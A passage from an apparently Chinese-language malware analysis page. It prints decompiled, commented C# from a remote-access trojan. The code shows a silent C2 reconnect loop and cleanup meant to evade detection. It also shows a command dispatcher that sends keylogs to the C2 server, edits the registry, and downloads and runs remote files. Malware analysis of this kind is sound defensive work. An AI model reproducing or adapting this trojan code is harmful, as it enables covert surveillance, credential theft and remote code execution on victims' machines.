thread.Start(OK.MeM.ToArray());  // 传入完整数据                                    thread.Join(100);  // 等待线程执行100ms，不阻塞主线程                                    // 清理内存流，准备接收下一条指令                                    OK.MeM.Dispose();                                    OK.MeM = new MemoryStream();                                }                                goto IL_1B;  // 跳回循环开头，继续接收数据                            }                        }                        break;  // 无数据时退出while循环                    }                    Block_9:;  // 连接断开时的跳转标记                }                catch (Exception ex)                {                    // 静默捕获所有异常：无日志、无提示，避免暴露C2通信行为                }            }            // 连接断开后的清理+自动重连逻辑            do            {                try                {                    // 清理插件/钩子对象（OK.PLG）：避免残留被安全软件检测                    if (OK.PLG != null)                    {                        // 反射调用clear方法：混淆调用方式，规避特征检测                        NewLateBinding.LateCall(OK.PLG, null, &#x22;clear&#x22;, new object[0], null, null, null, true);                        OK.PLG = null;                    }                }                catch (Exception ex2)                {                    // 静默捕获异常                }                OK.Cn = false;  // 标记连接断开            }            // 循环调用OK.connect()重连C2服务器，直到重连成功            while (!OK.connect());            OK.Cn = true;  // 重连成功，恢复连接状态标记        }    }}"><div></div></button></div></figure></div>
<ul>
<li>
<p><strong><code>Ind()</code> (Instruction Dispatcher)</strong>: 接收并解析黑客的指令。支持的功能包括：</p>
<ul>
<li><code>rn</code> (Run): 下载并执行勒索病毒或其他木马。</li>
<li><code>kl</code> (Keylog): 上传窃取的键盘记录。</li>
<li><code>up</code> (Update): 自我更新。</li>
<li><code>un</code> (Uninstall): 自我卸载（清除痕迹）。</li>
</ul>
<div class="expressive-code"><figure class="frame" style="--lnWidth:3ch"><figcaption class="header"></figcaption><pre data-language="c#"><code><div class="ec-line"><div class="code"><span style="--0:#CB7676;--1:#AB5959">public</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">static</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">void</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">Ind</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4D9375;--1:#1E754F">byte</span><span style="--0:#666666;--1:#999999">[]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">b</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#758575DD;--1:#A0ADA0">// 1. 前置处理：解密/解码字节数组b，按分隔符OK.Y拆分为指令参数数组</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">string</span><span style="--0:#666666;--1:#999999">[]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">array</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">Strings</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Split</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">BS</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">ref</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">b</span><span style="--0:#666666;--1:#999999">),</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">checked</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">string</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">cmdType</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">];</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 指令类型（核心标识）</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 指令分支1：ll - 断开C2连接 ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">Operators</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">CompareString</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">cmdType</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">ll</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">false</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Cn</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">false</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 标记C2连接断开（RC函数会检测该标记并重连）</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 指令分支2：kl - 回传日志数据 ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">else</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">Operators</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">CompareString</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">cmdType</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">kl</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">false</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#758575DD;--1:#A0ADA0">// OK.ENB：加密/编码日志数据；OK.Send：向C2回传数据</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">kl</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ENB</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">ref</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">kq</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Logs</span><span style="--0:#666666;--1:#999999">));</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 指令分支3：prof - 注册表操作（写入/读取/删除） ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">else</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">Operators</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">CompareString</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">cmdType</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">prof</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">false</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">string</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">subCmd</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">];</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">subCmd</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">~</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 子指令~：写入注册表</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#758575DD;--1:#A0ADA0">// 调用之前分析的STV函数，写入注册表键值（类型1=String）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">STV</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">2</span><span style="--0:#666666;--1:#999999">],</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">3</span><span style="--0:#666666;--1:#999999">],</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">else</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">subCmd</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">!</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 子指令!：写入+读取注册表并回传</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">STV</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">2</span><span style="--0:#666666;--1:#999999">],</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">3</span><span style="--0:#666666;--1:#999999">],</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#758575DD;--1:#A0ADA0">// OK.GTV：读取注册表值；回传读取结果到C2</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">$"</span><span style="--0:#C98A7D;--1:#B56959">getvalue</span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}{</span><span style="--0:#C98A7D;--1:#B56959">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">]}{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">GTV</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D;--1:#B56959">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">],</span><span style="--0:#C98A7D;--1:#B56959"> </span><span style="--0:#C98A7D77;--1:#B5695977">""</span><span style="--0:#666666;--1:#999999">)}</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">else</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">subCmd</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">@</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 子指令@：删除注册表值</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">DLV</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">2</span><span style="--0:#666666;--1:#999999">]);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// DLV=Delete Registry Value，删除指定注册表项</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 指令分支4：rn - 远程下载并执行文件（核心恶意行为） ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">else</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">Operators</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">CompareString</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">cmdType</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">rn</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">false</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">byte</span><span style="--0:#666666;--1:#999999">[]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">fileData</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#758575DD;--1:#A0ADA0">// 场景1：array[2]首字符是\u001f（自定义标记），从字节数组中提取加密数据并解压</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">2</span><span style="--0:#666666;--1:#999999">][</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">'</span><span style="--0:#C99076;--1:#A65E2B">\u001f</span><span style="--0:#666666;--1:#999999">'</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#5DA994;--1:#2E8F82">MemoryStream</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ms</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">MemoryStream</span><span style="--0:#666666;--1:#999999">();</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#4D9375;--1:#1E754F">int</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">skipLen</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#666666;--1:#999999">).</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">ms</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Write</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">b</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">skipLen</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">b</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">skipLen</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">fileData</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ZIP</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">ms</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ToArray</span><span style="--0:#666666;--1:#999999">());</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// ZIP=解压/解密数据</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">catch</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">MSG</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">Execute ERROR</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 向C2反馈执行失败</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">bla</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#4D9375;--1:#1E754F">return</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#758575DD;--1:#A0ADA0">// 场景2：从远程URL下载文件（WebClient下载）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span 